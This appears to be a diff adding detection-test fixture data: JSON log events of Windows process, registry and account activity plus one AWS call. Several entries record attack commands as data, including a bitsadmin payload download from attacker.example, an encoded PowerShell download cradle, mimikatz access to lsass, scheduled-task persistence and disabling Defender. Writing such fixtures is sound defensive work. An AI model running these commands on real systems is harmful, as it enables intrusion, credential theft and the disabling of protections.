@@ -1,0 +1,12 @@
+{"EventID":1,"Image":"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe","CommandLine":"powershell -enc JABjAD0ASQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQA","User":"CORP\\mohith"}
+{"EventID":1,"Image":"C:\\Windows\\System32\\schtasks.exe","CommandLine":"schtasks.exe /create /tn EvilTask /sc minute /mo 5 /tr C:\\users\\public\\bad.exe","User":"SYSTEM"}
+{"EventID":1,"Image":"C:\\Windows\\System32\\bitsadmin.exe","CommandLine":"bitsadmin /transfer evil /download https://attacker.example/payload.bin C:\\temp\\p.bin"}
+{"EventID":10,"TargetImage":"C:\\Windows\\System32\\lsass.exe","GrantedAccess":"0x1410","SourceImage":"C:\\temp\\mimikatz.exe"}
+{"EventID":1,"Image":"C:\\Windows\\System32\\cmd.exe","CommandLine":"cmd.exe /Q /c whoami > \\\\.\\pipe\\impacket 2>&1","ParentImage":"C:\\Windows\\System32\\services.exe"}
+{"EventID":1,"Image":"C:\\Windows\\System32\\cmd.exe","CommandLine":"cmd.exe /c whoami","ParentImage":"C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE"}
+{"EventID":13,"TargetObject":"HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\DisableAntiSpyware","Details":"DWORD (0x00000001)"}
+{"EventID":1,"Image":"C:\\Windows\\System32\\whoami.exe","CommandLine":"whoami /all"}
+{"userIdentity":{"type":"Root"},"eventType":"AwsApiCall","eventName":"CreateUser"}
+{"EventID":1,"Image":"C:\\Windows\\System32\\notepad.exe","CommandLine":"notepad.exe"}
+{"EventID":1,"Image":"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe","CommandLine":"powershell -c 'aW1wb3J0LW1vZHVsZSAobmV3LW9iamVjdCBuZXQud2ViY2xpZW50KS5kb3dubG9hZHN0cmluZygnaHR0cHM6Ly9iYWRndXkuY29tL3NlY3VyaXR5LXBhdGNoLnBzMScp'"}
+{"EventID":4728,"TargetUserName":"Domain Admins","SubjectUserName":"attacker","MemberName":"CN=mohith,CN=Users,DC=corp,DC=local"}
